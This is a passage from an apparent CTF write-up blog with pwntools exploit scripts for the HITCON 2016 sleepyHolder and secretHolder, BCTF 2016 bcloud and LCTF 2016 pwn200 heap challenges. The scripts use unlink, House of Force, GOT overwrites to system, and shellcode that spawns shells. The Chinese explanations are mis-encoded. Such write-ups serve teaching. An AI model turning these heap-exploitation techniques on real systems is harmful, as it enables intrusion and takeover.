</span></span><span class=line><span class=cl><span class=n>fflush</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;fflush&#39;</span><span class=p>,</span><span class=n>fflush</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>fflush</span><span class=p>,</span><span class=s1>&#39;fflush&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=part-iii>Part III</h2><h3 id=sleepyholder_hitcon_2016>sleepyHolder_hitcon_2016</h3><p>è¿™é“é¢˜å…è®¸ä¿å­˜ small/big/huge secretï¼Œå…¶ä¸­ huge åªèƒ½ä¿å­˜ä¸€æ¬¡ï¼Œä¸èƒ½åˆ é™¤å’Œä¿®æ”¹ï¼Œå¹¶ä¸”åœ¨ä¿å­˜äº†ä¸€ä¸ª small/big ä¹‹åå°±ä¸èƒ½å†ä¿å­˜æ–°çš„ small/big äº†ï¼Œåªèƒ½ renewã€‚</p><p>æ˜¾ç„¶è¿™ä¸ª huge å°±æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒã€‚å®é™…ä¸Šï¼Œhuge çš„èŒƒå›´å±äº large binï¼Œåœ¨ç”³è¯·è¿™ä¹ˆå¤§çš„ chunk æ—¶å¦‚æœ unsorted bin ä¸­æ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„ï¼Œå°±ä¼šè§¦å‘ <code>malloc_consolidate()</code>ï¼Œä½¿ fastbin ä¸­çš„ chunk åˆå¹¶è¿›å…¥ unsorted binï¼Œæœ€ç»ˆæ ¹æ®åˆå¹¶åçš„å¤§å°è¿›å…¥ small bin æˆ– large binã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å…ˆç”³è¯·ä¸€ä¸ª smallï¼Œç„¶åç”³è¯· big é˜²æ­¢ small è¢«é‡Šæ”¾æ—¶ä¸ top chunk åˆå¹¶ï¼Œå†é‡Šæ”¾ smallã€‚æ­¤æ—¶ small è¿›å…¥ fastbinï¼Œå†ç”³è¯· huge å³å¯è®© small è¿›å…¥åˆ° small binã€‚</p><p>ç”±äºè¿™æ—¶ small å·²ç»ä¸å¤„äº fastbin é“¾è¡¨å¤´äº†ï¼Œæ‰€ä»¥å†æ¬¡é‡Šæ”¾å¹¶ä¸ä¼šå‡ºé”™ï¼Œé€ æˆ double freeã€‚è¿™æ ·ä¹‹ååœ¨ small å†…ä¼ªé€  chunk å¹¶ unlink åŠ«æŒ GOT è¡¨å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 1-&gt;fastbin</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># consolidate,1-&gt;unsorted bin-&gt;smallbin</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>small_secret</span> <span class=o>=</span> <span class=mh>0x6020d0</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>small_secret</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>small_secret</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ?,big,huge,small,big_flag,huge_flag,small_flag</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span> <span class=c1># free -&gt; puts</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=secretholder_hitcon_2016>secretHolder_hitcon_2016</h3><p>ç±»ä¼¼ä¸Šä¸€é¢˜ï¼Œä¸è¿‡ huge å¯ä»¥ä¿®æ”¹å’Œåˆ é™¤äº†ã€‚ç”±äº huge éå¸¸å¤§ï¼Œåˆ†é…æ—¶ä¼šè°ƒç”¨ <code>mmap()</code>ï¼Œä½†æ˜¯å½“é‡Šæ”¾æ‰ huge å†ç”³è¯·æ—¶ï¼Œ<code>mmap_threshold</code> å·²ç»å˜å¾—å’Œ huge ä¸€æ ·å¤§ï¼Œæ­¤æ—¶åˆ†é… huge ä½¿ç”¨çš„æ˜¯ <code>brk()</code>ï¼Œå› æ­¤ huge è¢«åˆ†é…åˆ°äº†å †ä¸Šã€‚</p><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä»¤ small å’Œ huge åœ°å€é‡åˆï¼Œéšååœ¨ä¸‹é¢å«ä¸Š bigã€‚åœ¨ small é‡Œä¼ªé€ å †å—å¹¶é‡Šæ”¾ bigï¼Œè§¦å‘ unlinkï¼Œå‰©ä½™çš„å·¥ä½œå°±å’Œä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>type</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Renew secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Huge secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>type</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sa</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=nb>type</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Renew secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Huge secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>type</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=nb>type</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Renew secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Huge secret&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>type</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sa</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># mmap threshold +++</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># brk()</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># small &lt;-&gt; huge</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>small</span> <span class=o>=</span> <span class=mh>0x6020b0</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>small</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>small</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>,</span><span class=mh>0x20</span><span class=p>,</span><span class=mh>0x90</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ?,big,huge,small,big_flag,huge_flag,small_flag</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span> <span class=c1># free -&gt; puts</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=bcloud_bctf_2016>bcloud_bctf_2016</h3><p>åœ¨è¯»å…¥åå­—å’Œè¯»å…¥ Org ä»¥åŠ Host æ—¶ï¼Œå‡å­˜åœ¨åŒæ ·çš„ <code>strcpy</code> æ¼æ´ï¼Œå‰è€…å¯¼è‡´æ³„éœ²å †åœ°å€ï¼Œè€Œåè€…å…è®¸æˆ‘ä»¬ off-by-one ä¿®æ”¹ top chunk çš„å¤§å°ï¼Œä»è€Œå®ç° House of Forceã€‚é€šè¿‡ gdb è°ƒè¯•å¾—åˆ° <code>top_chunk = heap + 0xd0</code>ï¼Œé‚£ä¹ˆæ„é€ çš„ <code>evil_size</code> å°±æ˜¯æˆ‘ä»¬æƒ³åˆ†é…åˆ°çš„ <code>note_len</code> æ•°ç»„åœ°å€å‡å» header çš„ 0x8ï¼Œå‡å» <code>old_top_chunk</code> åœ°å€ï¼Œå†å‡å» 12ï¼Œè¿™æ˜¯å› ä¸ºå·²ç»åˆ†é…äº†ä¸‰ä¸ªå †å—ï¼Œåœ¨ç¨‹åºä¸­æ¯ä¸ªå †å—é¢å¤–åˆ†é…äº† 4Bã€‚æœ€åä» <code>note_len</code> è¦†ç›–åˆ° <code>note</code> æ•°ç»„ï¼ŒåŠ«æŒ <code>free</code> åˆ° <code>printf</code> æ³„éœ² libcï¼Œå†åŠ«æŒ <code>atoi</code> åˆ° <code>system</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;name:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Org:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Host:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note_len</span> <span class=o>=</span> <span class=mh>0x804b0a0</span>
</span></span><span class=line><span class=cl><span class=n>note</span> <span class=o>=</span> <span class=mh>0x804b120</span>
</span></span><span class=line><span class=cl><span class=n>top_chunk</span> <span class=o>=</span> <span class=n>heap</span> <span class=o>+</span> <span class=mh>0xd0</span>
</span></span><span class=line><span class=cl><span class=n>evil_size</span> <span class=o>=</span> <span class=n>note_len</span><span class=o>-</span><span class=mh>0x8</span><span class=o>-</span><span class=n>top_chunk</span><span class=o>-</span><span class=mh>0xc</span> <span class=c1># gdb</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>evil_size</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>((</span><span class=n>note</span><span class=o>-</span><span class=n>note_len</span><span class=p>)</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># printf(atoi.got)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=lctf2016_pwn200>lctf2016_pwn200</h3><p>é¦–å…ˆä¸éš¾å‘ç°è¯»å…¥ <code>name</code> æ—¶å­˜åœ¨ off-by-oneï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ²æ ˆåœ°å€ã€‚ä¸ºäº†åé¢ ret2shellcodeï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåœ¨ <code>name</code> é‡Œé¡ºä¾¿å†™å¥½ shellcodeï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>48</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;u?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rbp</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;, w&#39;</span><span class=p>,</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;rbp&#39;</span><span class=p>,</span><span class=n>rbp</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>è€Œè¯»å…¥ <code>money</code> æ—¶ï¼Œæ°å¥½å¯ä»¥è¦†ç›–åˆ°å †æŒ‡é’ˆ <code>dest</code>ã€‚é‚£ä¹ˆå¯ä»¥è¦†ç›– <code>dest</code> ä¸ºæˆ‘ä»¬ä¼ªé€ çš„ chunkï¼ŒåŒæ—¶å‡†å¤‡å¥½ <code>id</code>ï¼ˆåªéœ€è¦å¤§äº 0x10 å°äº 0x21000 å³å¯ï¼‰ä½œä¸º <code>nextsize</code>ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆé‡Šæ”¾å†ç”³è¯·è¿™ä¸ª fake chunkï¼Œå°±å¯ä»¥æ§åˆ¶ rip äº†ï¼Œæœ€åè¦†ç›– rip ä¸º shellcode åœ°å€ã€‚</p><p>é€šè¿‡ gdb è°ƒè¯•ï¼Œå¯ä»¥ç»˜åˆ¶å¤§è‡´çš„æ ˆç»“æ„å›¾ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
